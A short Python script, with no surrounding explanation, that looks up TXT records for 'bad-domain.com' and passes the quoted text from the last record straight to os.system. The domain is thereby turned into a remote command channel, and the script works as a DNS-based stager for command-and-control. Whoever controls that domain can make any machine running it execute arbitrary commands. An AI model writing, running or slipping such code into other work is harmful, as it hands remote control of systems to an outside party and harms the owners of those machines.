#!/usr/bin/python3

import os, sys
import dns.resolver

result = dns.resolver.resolve('bad-domain.com', 'TXT')

for cmdval in result:
  
  text = cmdval.to_text()
  result = text.split('"')[1].split('"')[0]

os.system(result)
